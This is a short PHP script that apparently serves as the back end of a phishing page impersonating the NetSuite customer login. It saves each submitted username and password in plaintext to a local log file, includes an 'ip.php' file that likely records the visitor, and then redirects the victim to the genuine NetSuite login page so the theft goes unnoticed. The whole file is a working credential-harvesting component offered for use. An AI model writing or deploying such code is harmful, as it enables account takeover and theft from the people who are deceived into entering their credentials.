<?php

include 'ip.php';

file_put_contents("./logs/usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://system.netsuite.com/pages/customerlogin.jsp?country=US');
exit();
